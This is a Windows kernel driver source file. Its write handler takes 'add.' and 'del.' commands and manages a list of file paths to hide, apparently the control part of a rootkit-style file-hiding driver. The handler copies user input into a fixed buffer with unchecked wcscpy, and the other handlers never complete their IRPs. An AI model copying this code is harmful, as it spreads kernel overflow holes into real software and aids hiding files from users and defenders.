#include "irp_major_functions.h"

/* IRP Functions. */

NTSTATUS Create_DeviceIo(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(Irp);

    return STATUS_SUCCESS;
}

NTSTATUS Close_DeviceIo(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(Irp);

    return STATUS_SUCCESS;
}

NTSTATUS Io_Unsupported(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(Irp);

    return STATUS_SUCCESS;
}

NTSTATUS Buffered_Write(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    // Initializing variables.
    UNREFERENCED_PARAMETER(DeviceObject);
    PIO_STACK_LOCATION pIoStackIrp = NULL;
    PWCHAR pInBuffer = NULL;
    ULONG bufLength;

    pIoStackIrp = IoGetCurrentIrpStackLocation(Irp); // Set a pointer to the most recent IRP on the stack.
    if (pIoStackIrp)
    {
        pInBuffer = (PWCHAR)Irp->AssociatedIrp.SystemBuffer; // Pointer to the recived buffer written to our IO Device (May not be null-terminated).
        if (pInBuffer)
        {
            bufLength = pIoStackIrp->Parameters.Write.Length; // Saves the length of the buffer.

            // Recieved add path to list command (e.g. `add.\\Device\Harddisk2\Users\Desktop\file.txt`)
            if (bufLength > wcslen(ADD_CMD_PREFIX) && !wcsncmp(pInBuffer, ADD_CMD_PREFIX, wcslen(ADD_CMD_PREFIX)))
            {
                // Add received path to the hide list.
                path_t path;
                path.length = bufLength / sizeof(WCHAR) - wcslen(ADD_CMD_PREFIX); // The recieved size is double in size because it's in normal char length + the `add.` command. So this strips them.
                wcscpy(path.path, &pInBuffer[wcslen(ADD_CMD_PREFIX)]);
                ForceNullTerminationWide(path.path, path.length);
                InsertToArray(&hidePathsArr, path);

                DbgPrintEx(0, 0, "Added path to hide list: SZ:%u, STR:%S", path.length, path.path);
            }
            // Recieved remove path from list command (e.g. `del.\\Device\Harddisk2\Users\Desktop\file.txt`)
            else if (bufLength > wcslen(REMOVE_CMD_PREFIX) && !wcsncmp(pInBuffer, REMOVE_CMD_PREFIX, wcslen(REMOVE_CMD_PREFIX)))
            {
                // Remove received path from the hide list.
                path_t path;
                path.length = bufLength / sizeof(WCHAR) - wcslen(REMOVE_CMD_PREFIX); // The recieved size is double in size because it's in normal char length + the `del.` command. So this strips them.
                wcscpy(path.path, &pInBuffer[wcslen(REMOVE_CMD_PREFIX)]);
                ForceNullTerminationWide(path.path, path.length);
                RemoveFromArray(&hidePathsArr, path);

                DbgPrintEx(0, 0, "Removed path from hide list: SZ:%u, STR:%S", path.length, path.path);
            }
        }
    }

    return STATUS_SUCCESS;
}
